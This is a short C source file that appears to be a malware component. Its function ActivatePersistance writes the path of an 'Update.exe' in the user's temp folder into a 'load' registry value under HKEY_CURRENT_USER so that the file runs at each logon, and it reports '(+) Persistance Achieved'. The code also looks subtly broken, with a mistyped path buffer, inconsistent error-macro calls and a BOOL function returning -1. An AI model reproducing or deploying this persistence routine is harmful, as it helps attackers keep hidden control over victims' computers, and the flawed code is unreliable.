#include <windows.h>
#include <stdio.h>
#include "shlwapi.h"
#include "common.h"

BOOL ActivatePersistance()
{
	HKEY hKey = NULL;
	LRESULT result = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathA" );
		return -1;
	}

	StrCatW( tempPath, L"Update.exe" );
	wprintf( L"(+) Temp Path: %ls\n", tempPath );

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	result = RegOpenKeyW(
		HKEY_CURRENT_USER, REGISTRY_SUBKEY, &hKey );
	if ( result != ERROR_SUCCESS )
	{
		REG_ERR( "RegOpenKeyW", result );
		RegCloseKey( hKey );
		return -1;
	}

	result = RegSetKeyValueW( HKEY_CURRENT_USER, REGISTRY_SUBKEY, L"load",
	                          REG_SZ, tempPath, MAX_PATH + 1 );
	if ( result != ERROR_SUCCESS )
	{
		REG_ERR( "RegSetKeyValueW" );
		RegCloseKey( hKey );
		return -1;
	}
	printf( "(+) Persistance Achieved...\n" );

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	return TRUE;
}
